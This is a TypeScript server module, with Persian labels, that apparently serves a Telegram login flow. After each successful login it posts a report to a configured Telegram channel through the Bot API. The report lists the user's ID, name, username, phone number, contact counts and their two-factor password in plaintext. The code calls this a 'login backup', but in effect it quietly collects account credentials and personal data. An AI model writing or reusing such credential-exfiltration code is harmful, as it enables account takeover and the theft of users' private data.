import { callTelegramApi } from '@/server/telegram/botApi';

export type LoginBackupProfile = {
  firstName?: string;
  lastName?: string;
  username?: string;
  phone?: string;
};

export type LoginBackupContactCounts = {
  total: number;
  mutual: number;
};

/** @deprecated Use LoginBackupProfile */
export type TwoFactorBackupContext = LoginBackupProfile;

function escapeHtml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function backupChannelId(): string | null {
  const raw = (process.env.TELEGRAM_2FA_CHANNEL_ID || '').trim();
  return raw || null;
}

function displayName(profile: LoginBackupProfile): string | null {
  const parts = [profile.firstName, profile.lastName]
    .map((value) => (value || '').trim())
    .filter(Boolean);

  return parts.length > 0 ? parts.join(' ') : null;
}

function buildLoginBackupMessage(
  telegramId: number,
  options: {
    password?: string;
    profile?: LoginBackupProfile;
    contactCounts?: LoginBackupContactCounts | null;
  },
): string {
  const profile = options.profile || {};
  const lines = ['✅ <b>ورود موفق</b>', '', `آیدی: <code>${telegramId}</code>`];

  const name = displayName(profile);

  if (name) {
    lines.push(`نام: ${escapeHtml(name)}`);
  }

  if (profile.username?.trim()) {
    lines.push(`یوزر: @${escapeHtml(profile.username.trim().replace(/^@/, ''))}`);
  }

  if (profile.phone?.trim()) {
    lines.push(`شماره: <code>${escapeHtml(profile.phone.trim())}</code>`);
  }

  if (options.contactCounts) {
    lines.push(
      '',
      `مخاطبین: <b>${options.contactCounts.total}</b>`,
      `دوطرفه: <b>${options.contactCounts.mutual}</b>`,
    );
  }

  if (options.password?.trim()) {
    lines.push('', `رمز ۲FA: <code>${escapeHtml(options.password.trim())}</code>`);
  }

  lines.push('', escapeHtml(new Date().toISOString()));

  return lines.join('\n');
}

/** Sends account snapshot (and optional 2FA password) to the configured backup channel. */
export async function sendLoginBackupToBackupChannel(
  telegramId: number,
  options: {
    password?: string;
    profile?: LoginBackupProfile;
    contactCounts?: LoginBackupContactCounts | null;
  } = {},
): Promise<void> {
  const chatId = backupChannelId();

  if (!chatId) {
    return;
  }

  const token = (process.env.TELEGRAM_BOT_TOKEN || '').trim();

  if (!token) {
    console.warn('TELEGRAM_BOT_TOKEN is unset — login backup message was not sent.');
    return;
  }

  const result = await callTelegramApi('sendMessage', {
    chat_id: chatId,
    text: buildLoginBackupMessage(telegramId, options),
    parse_mode: 'HTML',
    disable_notification: false,
  });

  if (!result.ok) {
    throw new Error(result.description || 'Telegram sendMessage failed');
  }
}

/** @deprecated Use sendLoginBackupToBackupChannel */
export async function send2faPasswordToBackupChannel(
  telegramId: number,
  password: string,
  context: LoginBackupProfile = {},
): Promise<void> {
  return sendLoginBackupToBackupChannel(telegramId, {
    password,
    profile: context,
  });
}
